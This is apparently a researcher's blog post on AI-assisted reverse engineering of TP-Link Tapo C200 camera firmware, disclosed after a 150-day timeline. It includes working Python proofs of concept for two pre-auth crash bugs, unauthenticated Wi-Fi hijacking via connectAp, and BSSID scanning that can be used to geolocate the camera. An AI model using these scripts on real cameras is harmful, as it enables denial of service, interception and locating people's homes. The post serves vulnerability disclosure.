---
title: 'TP-Link Tapo C200: Hardcoded Keys, Buffer Overflows and Privacy in the Era of AI Assisted Reverse Engineering | evilsocket'
url: https://www.evilsocket.net/2025/12/18/TP-Link-Tapo-C200-Hardcoded-Keys-Buffer-Overflows-and-Privacy-in-the-Era-of-AI-Assisted-Reverse-Engineering/
site_name: hackernews
fetched_at: '2025-12-20T11:06:47.589967'
original_url: https://www.evilsocket.net/2025/12/18/TP-Link-Tapo-C200-Hardcoded-Keys-Buffer-Overflows-and-Privacy-in-the-Era-of-AI-Assisted-Reverse-Engineering/
author: sibellavia
date: '2025-12-20'
---

Hi friends and welcome to the last post for this year! Whenever someone asks me how to get started with reverse engineering, I always give the same advice: buy the cheapest IP camera you can find. These devices are self-contained little ecosystems - they have firmware you can extract, network protocols you can sniff, and mobile apps you can decompile. Chances are, you’ll find something interesting. At worst, you’ll learn a lot about assembly and embedded systems. At best, you’ll find some juicy vulnerability and maybe learn how to exploit it!

I own several TP-Link Tapo C200 cameras myself. They’re cheap (less than 20 EUR from Italy), surprisingly stable, and I genuinely like them - they just work. One weekend, I decided just for fun to take my own advice. The Tapo C200 has been around for a while and has hada few CVEsdiscovered and more or less patched over the years, so I honestly wasn’t expecting to find much in the latest firmware. However, I wanted to use this chance to perform someAI assisted reverse engineeringand test whether I could still find anything at all.

I documented the entire process live onArcadia- my thought process, the dead ends, the AI prompts that worked and the ones that didn’t. If you want the raw, unfiltered version with screenshots and videos of things crashing, go check that out.

This post is the cleaned-up version of that journey, where I wanted to show how I approach firmware analysis these days, now that we have AI. You will notice that in several instances I will be particularly lazy and delegate to AI things I could have done manually and/or inferred myself after some more work. Keep in mind that while Iamgenerally lazy, this was also an experiment in integrating and documenting how effective AI can be for security research and reverse engineering, and especially in making them accessible to less experienced/sophisticated researchers/attackers.

What started as a lazy weekend project turned into finding a few security vulnerabilities that affect about25,000 of these devices directly exposed on the internet.

## Getting the Firmware

### Tools

* Old friendJD-GUIto reverse the Android app and get a sense of things
* The AWS CLIto download the firmware image.
* binwalkfor firmware inspection.
* Grokto give a quick AI assisted look into prior research.

The first step is always obtaining the firmware binary file and this time it was super easy! After somebasic reversingof theTapo Android app, I found out that TP-Link have their entire firmware repository in an open S3 bucket. No authentication required. So, you can list and download every version of every firmware they’ve ever released for any device they ever produced:

1
$ aws s3 ls s3://download.tplinkcloud.com/ --no-sign-request --recursive

The entire output is here, for the curious. This provides access to the firmware image of every TP-Link device - routers, cameras, smart plugs, you name it. A reverse engineer’s candy store.

I grabbed version1.4.2 Build 250313 Rel.40499nfor the C200 (Hardware Revision 3), namedTapo_C200v3_en_1.4.2_Build_250313_Rel.40499n_up_boot-signed_1747894968535.bin, and started poking around. However, the first attempt at identifying its format via binwalk was not successful, indicating that some sort of encryption or obfuscation was in place.

And here is where I started using AI. I used Grok todo some deep researchon how to decrypt the firmware for these cameras. Since I knew other hackers worked on this before, I delegated searching into hundreds of relevant web pages to the AI:

### Decrypting the Firmware

### Tools

* Thetp-link-decrypttool to decrypt the firmware image.
* binwalkfor firmware inspection.

Thanks to Grok, thetp-link-decrypttool and the fact that every firmware image for every device seems to be encrypted the same exact way, we can now decrypt the firmware. The tool extracts RSA keys from TP-Link’s own GPL code releases - they publish the decryption keys themselves as part of their open source obligations.

Credits to @watchfulip for theoriginal extensive TP-Link firmware researchand @tangrs forfinding that the relevant binaries are published in TP-Link GPL code dumps and how to extract keys from them.

1
2
3
4
5
6
$ git
clone
 https://github.com/robbins/tp-link-decrypt
$
cd
 tp-link-decrypt
$ ./preinstall.sh
# Install dependencies
$ ./extract_keys.sh
# Extract RSA keys from TP-Link's GPL code
$ make
$ bin/tp-link-decrypt Tapo_C200_firmware.bin

After decryption, the firmware revealed a fairly standard structure: a bootloader, a kernel, and a SquashFS root filesystem.

1
$ binwalk -e Tapo_C200_v3_1.4.2_decrypted.bin

## Hunting for Bugs

### Tools

* Ghidrato decompile and understand the MIPS binaries
* GhidraMCPto let an AI connect to my running Ghidra instance and support me in the process.
* Clineto ask AI to explore the filesystem and find interesting components.
* A mix ofAnthropic's Opus and Sonnet 4.

Once extracted, I used AI and Cline to explore the filesystem in search of which components handle the discovery protocol, camera web API, video streaming, etc all discovered earlier while reversing the Android app.

Claude Opus 4: "this is the firmware of an ipcam, i'm trying to find where the webapp that serves the API is managed"pic.twitter.com/NrgtKGUD8h

— Simone Margaritelli (@evilsocket)
July 18, 2025

Loading Ghidra and giving a quick look at thetp_managebinary, revealed the first interesting thing:

This private key is not generated at boot. Similarly toCVE-2025-1099 for the C500, the C200 embeds in its firmware the private key that serves the SSL for a few APIs. If you’re on the same network as a camera, you can MitM and decrypt their HTTPS traffic with keys you extracted from the firmware image - without ever touching the hardware. For asecuritycamera streaming video of people’s homes, this is… not ideal.

I kept loading the other interesting binaries and exploring them in Ghidra using AI to quickly get a sense of the main features and possible entry points for an attacker.

Asking AI to explain a functionand its relation to the other functions proved to be very useful for instance to understand encryption / obfuscation routines and network protocol handlers. This allows you to go from here:

To a higher level understanding that the AI can provide:

Another technique I found particularly effective is asking the AI to analyze a given function of interest andrename its variables and parameters to something meaningful based on context. Then do the same for the functions it calls, recursively following the branches you’re interested in. After a few iterations, what started asFUN_0042eb7c(undefined2 *param_1, undefined4 param_2, int param_3)becomeshandleConnectAp(connection *conn, int flags, json *params)- and suddenly the decompiled code reads almost like the original source.

This iterative refinement approach, which I find a great example of human-AI collaboration where neither alone would be as efficient, is how I mapped most of the HTTP handlers, discovery protocol, and so on. What follows is the bottom line of my findings. For more details on the process, refer tothe original Discord thread.

As a side note, I did not investigate (much) the exploitability of the following bugs to achieve code execution, mostly because I’m not familiar with MIPS, and it was not my intent. You can however do it relatively easily onceobtained a shell via physical access, due to the presence of the/bin/gdbserverbinary in the firmware.

## Bug 1: Pre-Auth ONVIF SOAP XML Parser Memory Overflow

The Tapo C200 exposes an ONVIF service via the/bin/mainserver listening on port 2020 for interoperability with standard video management systems. The problem is in how it parses SOAP XML requests.

When processing XML elements, the parser (soap_parse_and_validate_requestat0x0045ae8c) callsds_parsewithout any bounds checking on the number of elements or total memory allocation. Send it enough XML elements, and you’ll overflow allocated memory.

Here’s the PoC:

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
#!/usr/bin/env python3
import
 urllib.request
import
 sys
TARGET = sys.argv[
1
]
ONVIF_PORT =
2020
# Generate 100,000 XML elements - this will overflow the parser
params =
''
.join([
f'<SimpleItem Name="Param
{i}
" Value="
{
"X"
 *
100
}
"/>'


for
 i
in

range
(
100000
)])
body =
f'''<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
<soap:Body>
<CreateRules xmlns="http://www.onvif.org/ver20/analytics/wsdl">
<ConfigurationToken>test</ConfigurationToken>
<Rule>
<Name>TestRule</Name>
<Type>tt:CellMotionDetector</Type>
<Parameters>
{params}
</Parameters>
</Rule>
</CreateRules>
</soap:Body>
</soap:Envelope>'''
req = urllib.request.Request(
f"http://
{TARGET}
:
{ONVIF_PORT}
/onvif/service"
,
 data=body.encode(
'utf-8'
))
req.add_header(
'Content-Type'
,
'application/soap+xml'
)
urllib.request.urlopen(req, timeout=
30
)

Send this, and the camera crashes, requiring a power cycle to recover.

pic.twitter.com/JQ64e9KAJp

— Simone Margaritelli (@evilsocket)
July 19, 2025

## Bug 2: Pre-Auth HTTPS Content-Length Integer Overflow

The HTTPS server routine running on port 443 has a classic integer overflow in itsContent-Lengthheader parsing. The vulnerable function at0x004bd054does this:

1
2
iVar1 = atoi(value);
param_1->content_length = iVar1;

That’s it. No bounds checking. No validation. Just rawatoi()on user input.

On a 32-bit system,atoi("4294967295")causes integer overflow, resulting in undefined behavior. In this case, the camera crashes:

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
#!/usr/bin/env python3
import
 socket
import
 ssl
import
 sys
TARGET = sys.argv[
1
]
request =
f"""POST / HTTP/1.1\r
Host:
{TARGET}
\r
Content-Length: 4294967295\r
Content-Type: application/octet-stream\r
Connection: close\r
\r
AAAA"""
context = ssl.create_default_context()
context.check_hostname =
False
context.verify_mode = ssl.CERT_NONE
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ssl_sock = context.wrap_socket(sock, server_hostname=TARGET)
ssl_sock.connect((TARGET,
443
))
ssl_sock.send(request.encode())

And twopic.twitter.com/tt7eL7MA27

— Simone Margaritelli (@evilsocket)
July 19, 2025

Another crash 💪

## Bug 3: Pre-Auth WiFi Hijacking

The camera exposes an API endpoint calledconnectApthat’s used during initial setup to configure WiFi. The problem? It’s accessiblewithout any authentication. Even after the camera is fully set up and connected to your network.

The vulnerable handler at0x0042eb7cprocesses the request without any auth checks:

1
2
3
4
5
6
7
void

connectApHandler
(undefined2 *param_1,undefined4 param_2,
int
 json_params)
{

// No authentication check here - just processes the request
 jso_add_string(iVar3,
"method"
,
"connectAp"
);
 jso_obj_add(iVar3,
"params"
,iVar2);
 iVar1 = ds_tapo_handle(param_1);
}

And three! 🚀pic.twitter.com/2GZiG4bTm0

— Simone Margaritelli (@evilsocket)
July 22, 2025

The exploit is trivial:

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
#!/usr/bin/env python3
import
 urllib.request
import
 ssl
import
 sys
TARGET = sys.argv[
1
]
# No auth needed - just send it
payload =
'{"method":"connectAp","params":{"onboarding":{"connect":{"ssid":"EVIL_NETWORK","bssid":"11:11:11:11:11:11","auth":3,"encryption":2,"rssi":3,"password":"hacked","pwd_encrypted":0}}}}'
context = ssl.create_default_context()
context.check_hostname =
False

context.verify_mode = ssl.CERT_NONE
req = urllib.request.Request(
f"https://
{TARGET}
/"
, data=payload.encode(
'utf-8'
))
req.add_header(
'Content-Type'
,
'application/json'
)
urllib.request.urlopen(req, context=context, timeout=
10
)

This allows a remote attacker to:

* Disconnect the camerafrom its legitimate network (DoS)

If in WiFi range proximity:

* Force it to connect to an attacker-controlled network(MitM)
* Intercept all video trafficonce on the malicious network (not that we really needed this since the HTTPS private key is shared by all devices, as mentioned earlier XD)
* Maintain persistent accesseven if the owner changes their WiFi password

## Bug 4: Pre-Auth Nearby WiFi Network Scanning

Related to Bug 3, thescanApListmethod is also accessible without authentication - even when the device is not in onboarding mode. This endpoint returns a list of all WiFi networks visible to the camera:

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
#!/usr/bin/env python3
import
 urllib.request
import
 ssl
import
 sys
TARGET = sys.argv[
1
]
payload =
'{"method":"scanApList","params":{}}'
context = ssl.create_default_context()
context.check_hostname =
False

context.verify_mode = ssl.CERT_NONE
req = urllib.request.Request(
f"https://
{TARGET}
/"
, data=payload.encode(
'utf-8'
))
req.add_header(
'Content-Type'
,
'application/json'
)
response = urllib.request.urlopen(req, context=context, timeout=
10
)
print(response.read().decode())

A test on one of the devices exposed on the internet:

This is particularly concerning given the number of these devices exposed on the internet. An attacker can remotely enumerate WiFi networks in the camera’s vicinity, including:

* SSIDsof nearby networks
* BSSIDs(MAC addresses of access points)
* Signal strength(useful for triangulation)
* Security configurations

Here’s where it gets worse: tools likeapple_bssid_locatorcan query Apple’s location services API with a BSSID and return precise GPS coordinates.

This means an attacker can:

1. Find an exposed Tapo camera via services like ZoomEye, Shodan or similar indexes
2. UsescanApListto retrieve nearby WiFi BSSIDs
3. Query Apple’s location database with those BSSIDs
4. Pinpoint the camera’s physical location to within a few meters

Remote attackers can not only see what WiFi networks exist around a camera - they can determine exactly where that camera (and by extension, the home or business it’s monitoring) is located on a map.

## Disclosure

I’ve decided to follow theindustry standard90+30 daysresponsible disclosure process; here’s the timeline:

* July 22, 2025: Sent initial report to TP-Link’s security team (security@tp-link.com) with full technical details, PoC exploits and videos. All compiled according totheir guidelines.
* July 22, 2025: Acknowledgment received.
* August 22, 2025: TP-Link confirms they’re still reviewing the report
* September 27, 2025: TP-Link responds and sets the timeline for the remediation patch to the end of November 2025.
* November 2025: Nothing happens.
* December 1, 2025: Sent follow up email, no response.
* December 4, 2025: Sent another follow up email, which TP-Link responds to, further postponing the patch to the following week.
* The following week: Nothing happens.
* December 19, 2025: Public disclosureafter 150 days.

The 90+30 period has long passed, so I decided to publish this writeup.

## Conflict Of Interest

As of April 25, TP-Link is a CVE Numbering Authority (CNA). This means they have the authority to assign CVE identifiers for vulnerabilities in their own products - at least for the ones reported directly to them. And theyactively encourage responsible disclosure directly to their security team, which means they control a considerable pipeline of vulnerability reports.

On theirSecurity Commitment page, TP-Link prominently displays charts comparing their CVE count to competitors. They explicitly market themselves as having fewer CVEs than Cisco, Netgear, and D-Link. They state they “aim to patch vulnerabilities within 90 days.”

There’s an obvious and structural conflict of interest when a vendor is allowed to be their own CNA while simultaneously using their CVE count as a marketing metric.

#reversing

#re

#arm

#cve

#exploit

#vulnerability research

#privacy

#ai

#embedded devices

#iot security

#reverse engineering

#security

#iot

#ai assisted reverse engineering

#firmware

#ghidra

#ghidramcp

#integer overflow

#memory

#tplink

#tp-link

#tapo c200

#tapo camera

#china

#hardcoded credentials
